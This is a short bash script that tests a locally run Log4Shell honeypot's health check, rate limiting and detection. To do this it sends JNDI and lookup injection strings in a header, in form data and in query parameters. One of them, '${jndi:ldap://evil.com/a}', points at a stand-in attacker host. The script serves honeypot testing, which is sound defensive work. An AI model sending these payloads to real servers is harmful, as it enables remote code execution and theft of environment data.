#!/bin/bash

echo "=== Log4Shell Honeypot Test Script ==="

HONEYPOT_URL="http://localhost"

echo "1. Testing health endpoint..."
if curl -s -f "$HONEYPOT_URL/health" > /dev/null; then
    echo "✓ Health check passed"
else
    echo "✗ Health check failed"
    exit 1
fi

echo "2. Testing basic functionality..."
curl -s "$HONEYPOT_URL" > /dev/null
echo "✓ Basic request successful"

echo "3. Testing Log4Shell detection in headers..."
curl -s -H "X-Test: \${jndi:ldap://evil.com/a}" "$HONEYPOT_URL" > /dev/null
echo "✓ Header-based attack test sent"

echo "4. Testing Log4Shell detection in form data..."
curl -s -X POST -d "username=\${env:USER}&password=test" "$HONEYPOT_URL" > /dev/null
echo "✓ Form-based attack test sent"

echo "5. Testing Log4Shell detection in query parameters..."
curl -s "$HONEYPOT_URL?test=\${sys:java.version}" > /dev/null
echo "✓ Query parameter attack test sent"

echo "6. Testing rate limiting..."
for i in {1..5}; do
    curl -s "$HONEYPOT_URL" > /dev/null
done
echo "✓ Rate limiting test completed"

echo ""
echo "Test completed. Check logs with:"
echo "  ./monitor.py --hours 1"
echo "  docker-compose logs log4shell-honeypot"
